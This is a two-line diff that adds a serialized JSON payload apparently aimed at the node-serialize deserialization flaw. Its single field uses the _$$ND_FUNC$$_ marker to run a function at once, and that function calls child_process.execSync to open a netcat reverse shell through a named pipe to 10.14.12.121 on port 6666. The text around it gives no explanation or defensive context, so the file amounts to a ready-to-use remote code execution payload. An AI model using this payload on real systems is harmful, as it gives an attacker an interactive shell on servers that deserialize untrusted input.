@@ -1,0 +1,2 @@
+Serialized:
+{"test":"_$$ND_FUNC$$_function(){\n  require('child_process').execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.12.121 6666 >/tmp/f\", function puts(error, stdout, stderr) {});\n}()"}
